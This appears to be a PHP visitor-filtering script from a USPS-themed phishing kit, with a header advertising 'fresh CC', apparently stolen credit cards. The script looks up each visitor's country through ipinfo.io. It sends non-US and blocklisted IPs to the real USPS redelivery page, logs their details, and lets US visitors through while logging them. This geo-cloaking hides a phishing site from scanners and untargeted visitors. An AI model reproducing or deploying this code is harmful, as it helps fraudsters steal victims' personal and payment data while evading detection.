<?php
/* 
***********************

CODED BY echo @ech0xd

More source code and tools and fresh CC

***********************
*/
 function VisitorIP()
  { 
  if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
  $TheIp=$_SERVER['HTTP_X_FORWARDED_FOR'];
  else $TheIp=$_SERVER['REMOTE_ADDR'];
  return trim($TheIp);
  }
  $ip = VisitorIP();

function ip_details($ip) 
{
    $Json       = file_get_contents("http://ipinfo.io/{$ip}");
    $details    = Json_decode($Json);
    return $details;
}
$details    =   ip_details("$ip");

$country = $details->country;  

  
$dieip_txt = file_get_contents("./result/dieip.txt");
$ip_list = explode(PHP_EOL,$dieip_txt);
$ini_array = parse_ini_file("./admin/setting.ini");
$IPX = strval($ini_array['WhitelistedIp']);


if ( $IPX == $ip ){


}else if(in_array($ip,$ip_list)){

    $os = $_SERVER['HTTP_USER_AGENT'];
    $click = fopen("./result/total_Blocked.txt","a");
    fwrite($click,"$ip|$country|$os"."\n");
    fclose($click);
    header("Location: https://tools.usps.com/redelivery.htm");
    exit(); 

}else if($country != "US"){
    
    $os = $_SERVER['HTTP_USER_AGENT'];
    $click = fopen("./result/total_Blocked.txt","a");
    fwrite($click,"$ip|$country|$os"."\n");
    fclose($click);
    header("Location: https://tools.usps.com/redelivery.htm");
    exit();     

} else {
    
    $os = $_SERVER['HTTP_USER_AGENT'];
    $click = fopen("./result/log_visitor.txt","a");
    date_default_timezone_set("Asia/Shanghai");
    $jam = date("y-m-d h:i:sa ");
    fwrite($click,"$jam|$ip|$country|$os"."\n");
    fclose($click);    
    
}

?>